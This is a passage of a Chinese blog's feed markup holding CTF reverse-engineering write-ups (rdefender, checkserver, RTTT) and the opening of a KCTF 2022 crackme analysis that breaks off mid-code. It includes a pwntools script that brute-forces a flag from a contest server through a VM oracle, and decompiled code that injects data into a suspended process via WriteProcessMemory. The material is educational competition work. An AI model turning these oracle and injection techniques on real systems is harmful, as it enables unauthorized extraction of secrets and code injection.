<span class="number">239</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">61</span>, <span class="number">214</span>, <span class="number">215</span>, <span class="number">73</span>, <span class="number">90</span>, <span class="number">126</span>, <span class="number">42</span>, <span class="number">30</span>, <span class="number">240</span>, <span class="number">79</span>, <span class="number">224</span>, <span class="number">78</span>, <span class="number">223</span>, <span class="number">111</span>, <span class="number">60</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">196</span>, <span class="number">231</span>, <span class="number">106</span>, <span class="number">64</span>, <span class="number">139</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">227</span>, <span class="number">238</span>, <span class="number">191</span>, <span class="number">127</span>, <span class="number">31</span>, <span class="number">156</span>, <span class="number">54</span>, <span class="number">241</span>, <span class="number">242</span>, <span class="number">134</span>, <span class="number">247</span>, <span class="number">128</span>, <span class="number">65</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">210</span>, <span class="number">236</span>, <span class="number">9</span>, <span class="number">193</span>]</span><br><span class="line">    plain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        ori = tbl.index(cipher[i])</span><br><span class="line">        ori &amp;= <span class="number">0xFF</span></span><br><span class="line">        plain += <span class="built_in">bytes</span>([ori ^ <span class="number">0xFF</span> ^ i])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(plain.decode())</span><br></pre></td></tr></table></figure><h2 id="rdefender"><a href="#rdefender" class="headerlink" title="rdefender"></a>rdefender</h2><p>有符号的 rustc 程序，其中定义了两个向量数组，记作 vec1 和 vec2，它们的最大元素个数都是 16。</p><p>首先将本地 flag 文件内容读取到向量，中作为 vec1 的第一项，再进入一个 while 1 循环，根据接收到的 8 字节指令执行不同的功能（根据指令的第一字节，可以判断要执行哪个功能）。</p><p>对于<strong>功能 1</strong>，其对应的 8 字节结构体为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  BYTE  identifier;  <span class="comment">// 只能为 0</span></span><br><span class="line">  BYTE  str[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该功能可以向 flag 所在的 vec1 中插入新向量，向量内容为通过 get_data 函数获得的用户输入及 str 字段内容。</p><p>对于<strong>功能 3</strong>，其对应的 8 字节结构体为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  BYTE  identifier; <span class="comment">// 只能为 2</span></span><br><span class="line">  BYTE  check_type; <span class="comment">// 可以为 &#123;0, 1, 2&#125; 中的一个</span></span><br><span class="line">  DWORD low;  <span class="comment">// 只能是 0x899C66D1</span></span><br><span class="line">  WORD  hi;   <span class="comment">// 只能是 0x5BF3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该功能可以向 vec2 中插入新向量，向量内容为通过 get_data 函数获得的用户输入及 check_type 字段内容。</p><p>对于<strong>功能 2</strong>，其对应的 8 字节结构体为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  BYTE  identifier; <span class="comment">// 只能为 1</span></span><br><span class="line">  BYTE  idx1;       <span class="comment">// 指定 vec1 下标</span></span><br><span class="line">  BYTE  idx2;       <span class="comment">// 指定 vec2 下标</span></span><br><span class="line">  BYTE  reserved[<span class="number">5</span>]; <span class="comment">// 保留不用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>功能 2 是程序的核心部分，其根据指定的 vec1 和 vec2 下标，从二者中分别取出 v1 = vec1[idx1] 及 v2 = vec2[idx2] ，根据 v2.check_type 字段值来决定如何进行 check。</p><p>check 方式同样有三种，以下记 v1 和 v2 中的用户输入为 data1 和 data2。</p><p>第一种（v2.check_type == 0）伪代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span>(<span class="params">data1: <span class="built_in">bytes</span>, data2: <span class="built_in">int</span></span>):</span></span><br><span class="line">    digest = reduce(<span class="keyword">lambda</span> x, y: x * <span class="number">131</span> + y, data1) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">if</span> digest == data2:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>第二种（v2.check_type == 1）伪代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span>(<span class="params">data1: <span class="built_in">bytes</span>, data2: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data1:</span><br><span class="line">        <span class="keyword">if</span> c == data2:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>由第二种功能可以确定 data1 中含有哪些字符，如果 data1 中字符不重复且比较短的话倒是可以结合功能 1 来确定这些字符的排列顺序。</p><p>第三种（v2.check_type == 2）实现了一个基于栈的小型 vm，将 data2 作为代码段，data1 作为数据段来运行。其中比较有用的是以下几条：</p><table><thead><tr><th>opcode</th><th>指令长度</th><th>指令构成</th><th>伪代码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>2</td><td>[opcode] [operand]</td><td>push operand</td><td>压入立即数</td></tr><tr><td>1</td><td>2</td><td>[opcode] [operand]</td><td>push data1[operand]</td><td>压入 data1 第 operand 项</td></tr><tr><td>3</td><td>2</td><td>[opcode] [operand]</td><td>push stack[top] ? stack[top - 1]   ; ？为 {+, -, *, /, &amp;, |, ^} 中的一个</td><td>将栈顶两个元素弹出，进行运算后将结果压入</td></tr><tr><td>5</td><td>1</td><td>[opcode]</td><td>return stack[top] == 0</td><td>结束虚拟机运行，返回栈顶元素是否为 0</td></tr></tbody></table><p>因此，可以构造这样一个爆破思路：将 flag 每个字符与猜测的立即数进行减或者异或运算，结束虚拟机运行，再根据服务器响应的返回值来判断猜测是否正确。</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    p.send(p32(<span class="built_in">len</span>(data)))</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_vec1</span>(<span class="params">name: <span class="built_in">bytes</span>, string: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    payload = p8(<span class="number">0</span>)</span><br><span class="line">    payload += name[:<span class="number">7</span>]</span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    get_data(string)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">idx1, idx2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">1</span>)</span><br><span class="line">    payload += p8(idx1)</span><br><span class="line">    payload += p8(idx2)</span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_vec2</span>(<span class="params">check_type, data</span>):</span></span><br><span class="line">    payload = p8(<span class="number">2</span>)</span><br><span class="line">    payload += p8(check_type)</span><br><span class="line">    payload += p32(<span class="number">0x899C66D1</span>)</span><br><span class="line">    payload += p16(<span class="number">0x5BF3</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    get_data(data)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;&#123;&#125;&quot;</span> + ascii_letters</span><br><span class="line"></span><br><span class="line">push_imm = <span class="keyword">lambda</span> v: p8(<span class="number">0</span>) + p8(v)</span><br><span class="line">take_flag_i = <span class="keyword">lambda</span> i: p8(<span class="number">1</span>) + p8(i)</span><br><span class="line">sub = <span class="keyword">lambda</span>: p8(<span class="number">3</span>) + p8(<span class="number">1</span>)</span><br><span class="line">xor = <span class="keyword">lambda</span>: p8(<span class="number">3</span>) + p8(<span class="number">6</span>)</span><br><span class="line">compare = <span class="keyword">lambda</span>: p8(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> cur <span class="keyword">in</span> charset:</span><br><span class="line">        p = remote(<span class="string">&quot;94.74.84.207&quot;</span>, <span class="number">7892</span>)</span><br><span class="line"></span><br><span class="line">        vm = push_imm(<span class="built_in">ord</span>(cur))</span><br><span class="line">        vm += take_flag_i(i)</span><br><span class="line">        vm += sub()</span><br><span class="line">        vm += compare()</span><br><span class="line">        add_vec2(<span class="number">2</span>, vm)</span><br><span class="line">        <span class="keyword">if</span> check(<span class="number">0</span>, <span class="number">0</span>) != <span class="number">1</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">        flag += cur</span><br><span class="line">        log.success(flag)</span><br><span class="line">        <span class="keyword">if</span> cur == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="checkserver"><a href="#checkserver" class="headerlink" title="checkserver"></a>checkserver</h2><p>本题基于 netlink 构建了一个 webserver，客户端对应的处理函数是 sub_401D40：</p><p><img src="/img/article/20221212/8.png" alt="checkserver"></p><p>将接收到的 HTTP 请求报文传入 do_response 函数（sub_404FB0），再传入 sub_404A10 进行 HTTP 报文解析。</p><p>如果请求体中含有 authcookie 键值对，则调用 sub_404530，并传入解析得到的 authcookie 值：</p><p><img src="/img/article/20221212/9.png" alt="checkserver"></p><p>地址 0x4045E5 处调用加密函数 sub_402040 对输入进行加密，该函数有非常明显的流加密特征，故可通过测试样例动调获取异或流。加密的结果在 0x4046C1 处与目标数组进行比较。</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plain = <span class="string">b&#x27;a&#x27;</span> * <span class="number">64</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;e1fa74991ffb1908ee2deeb7f0c92a0d76f57237aaf0c20ec9e122f388138a36a3e43076e11ed6f00fdba65d59583631bd129ae5edc191ee1a0deeb51114ba23&quot;</span>)</span><br><span class="line">tbl = [plain[i] ^ cipher[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">target = <span class="string">b&#x27;\xe6\xf7t\x9f\x05\xab\x1aP\xbf(\xb6\xe6\xa4\x9e\x7f\r&quot;\xacv`\xfd\xa6\x90^\x91\xb4v\xa3\x8dC\x885\xf4\xe0\x37\x6a&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, [tbl[i] ^ target[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target))]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="RTTT"><a href="#RTTT" class="headerlink" title="RTTT"></a>RTTT</h2><p>无符号的 rustc 程序，但是加密比较简单。程序先接收输入，将输入序列构建成一棵树，再对其进行遍历（sub_DBC0），遍历得到的结果只是字节位置发生了变化，可以通过测试样例找到它们的映射关系。</p><p>之后做 RC4 流加密（sub_E310），key 是两个数组异或得到的。</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">arr1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;7DF484DF4E311BFB2DE658DF549487D7D2D5FBD0&quot;</span>)</span><br><span class="line">arr2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2A91E8BC7E5C7EDB5989788D17C0C1F7E09AC9E2&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>([arr1[i] ^ arr2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr1))])</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;34C2652DDAC6B1AD47BA06A93BC1CCD7F12924392AC015027E10667B5EEA5ED05946E1D66E5EB2466B31&quot;</span>)</span><br><span class="line">dec = rc4.decrypt(target).decode()</span><br><span class="line"></span><br><span class="line">old = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP&quot;</span></span><br><span class="line">new = <span class="string">&quot;yJzLkHwDxaCAtnsPipmIBfhljdGbeOqKNcEMugvFor&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec)):</span><br><span class="line">        flag += dec[new.index(old[i])]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KCTF 2022 秋季赛第八题 - 商贸往来</title>
      <link href="/2022/12/04/KCTF-2022-%E7%A7%8B%E5%AD%A3%E8%B5%9B-%E7%AC%AC%E5%85%AB%E9%A2%98-%E5%95%86%E8%B4%B8%E5%BE%80%E6%9D%A5/"/>
      <url>/2022/12/04/KCTF-2022-%E7%A7%8B%E5%AD%A3%E8%B5%9B-%E7%AC%AC%E5%85%AB%E9%A2%98-%E5%95%86%E8%B4%B8%E5%BE%80%E6%9D%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>本题我愿称之为 ”非常 6 + 1“，一题更比 6 题强，下图是题目概况：</p><p><img src="/img/article/20221204/1.png" alt="challenge_info"></p><p>运行 32 位程序 <code>crackme.exe</code>，弹出一个经典 CM 界面，如下图所示。点击 check 按钮时，若输入的序列号错误，程序退出。</p><p><img src="/img/article/20221204/2.png" alt="challenge_info"></p><h2 id="管中窥豹"><a href="#管中窥豹" class="headerlink" title="管中窥豹"></a>管中窥豹</h2><p>该程序没有 main 函数，在 sub_402D4C 里首先通过 PEB 找到 kernel32 模块，拿到两个关键函数 GetProcAddress 和 LoadLibraryA。借助它们找到本函数内所需的所有导入函数，并将一众函数指针保存到自定义结构体中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">custom</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> kernel32_hModule;</span><br><span class="line">    HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);</span><br><span class="line">    FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);</span><br><span class="line">    <span class="comment">// LocalAlloc</span></span><br><span class="line">    <span class="comment">// ExitProcess</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>之后创建了一个事件 <code>poision132</code>（估计是用来防止多开的）与主对话框：</p><p><img src="/img/article/20221204/3.png" alt="sub_402D4C"></p><p>其中 GetModuleHandleW 的后四个参数实为 DialogBoxParamA 的参数，因为汇编里它们四个在调用 GetModuleHandleW 前就入栈了，IDA 没能分辨出来。</p><p>对话框对应的函数是这样处理 check 按下的：</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="">查看长代码    </button><div class="hide-content"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v22 == <span class="number">273</span> &amp;&amp; a3 == <span class="number">1002</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v40 = custom;</span><br><span class="line">  v21 = (*(custom + <span class="number">92</span>))(a1, <span class="number">1001</span>);           <span class="comment">// GetDlgItem</span></span><br><span class="line">  <span class="keyword">if</span> ( v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i )</span><br><span class="line">      input[i] = <span class="number">0</span>;</span><br><span class="line">    input_len = (*(v40 + <span class="number">96</span>))(v21);           <span class="comment">// GetWindowTextLengthA</span></span><br><span class="line">    <span class="keyword">if</span> ( input_len &lt;= <span class="number">210</span> &amp;&amp; input_len &gt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(v40 + <span class="number">100</span>))(v21, input, <span class="number">255</span>);        <span class="comment">// GetWindowTextA</span></span><br><span class="line">      input_len = (*(v40 + <span class="number">24</span>))(input);       <span class="comment">// lstrlenA</span></span><br><span class="line">      <span class="keyword">if</span> ( input_len &gt;= <span class="number">1</span> &amp;&amp; input_len &lt;= <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = input_len; j &lt; <span class="number">128</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> )</span><br><span class="line">            input[j] = <span class="number">32</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            input[j] = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v39 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v39 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v39 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v39 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v39 )</span><br><span class="line">  &#123;</span><br><span class="line">    v48 = custom;</span><br><span class="line">    <span class="keyword">if</span> ( (*(custom + <span class="number">56</span>))(<span class="number">0</span>, crackme_exe_path, <span class="number">255</span>) )<span class="comment">// GetModuleFileNameW</span></span><br><span class="line">    &#123;</span><br><span class="line">      v27 = <span class="number">104</span>;</span><br><span class="line">      v28 = <span class="number">0</span>;</span><br><span class="line">      v29 = <span class="number">-72</span>;</span><br><span class="line">      v30 = <span class="number">0</span>;</span><br><span class="line">      v31 = <span class="number">-1</span>;</span><br><span class="line">      v32 = <span class="number">-48</span>;</span><br><span class="line">      v19 = <span class="number">0</span>;</span><br><span class="line">      v36 = <span class="number">0</span>;</span><br><span class="line">      v8[<span class="number">17</span>] = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">0x44</span>; ++k )</span><br><span class="line">        *(v8 + k) = <span class="number">0</span>;</span><br><span class="line">      v8[<span class="number">0</span>] = <span class="number">68</span>;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">0x10</span>; ++m )</span><br><span class="line">        *(&amp;v42 + m) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(v48 + <span class="number">28</span>))(crackme_exe_path, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CREATE_SUSPENDED, <span class="number">0</span>, <span class="number">0</span>, v8, &amp;v42) )<span class="comment">// CreateProcessW</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6[<span class="number">0</span>] = <span class="number">65543</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !(*(v48 + <span class="number">32</span>))(v43, v6) )        <span class="comment">// GetThreadContext</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_69;</span><br><span class="line">        v19 = v6[<span class="number">44</span>];</span><br><span class="line">        v36 = (*(v48 + <span class="number">44</span>))(v42, <span class="number">0</span>, <span class="number">128</span>, <span class="number">4096</span>, <span class="number">4</span>);<span class="comment">// VirtualAllocEx</span></span><br><span class="line">        <span class="keyword">if</span> ( !v36 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_69;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">0x80</span>; n += v17 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(v48 + <span class="number">48</span>))(v42, n + v36, &amp;input[n], <span class="number">128</span> - n, &amp;v17) )<span class="comment">// WriteProcessMemory</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v16 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_69;</span><br><span class="line">LABEL_45:</span><br><span class="line">        v20 = (*(v48 + <span class="number">20</span>))(<span class="number">0</span>);               <span class="comment">// GetModuleHandleW</span></span><br><span class="line">        v10 = *(v20 + <span class="number">60</span>) + v20;</span><br><span class="line">        v9 = v19 - *(v10 + <span class="number">40</span>);</span><br><span class="line">        v11 = sub_B31000 - v20;</span><br><span class="line">        v28 = v36;</span><br><span class="line">        v30 = sub_B31000 + v9 - v20;</span><br><span class="line">        <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">0xC</span>; ii += v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(v48 + <span class="number">48</span>))(v42, ii + v19, &amp;v27 + ii, <span class="number">12</span> - ii, &amp;v15) )<span class="comment">// WriteProcessMemory</span></span><br><span class="line">          &#123;</span><br><span class="line">            v14 = <span 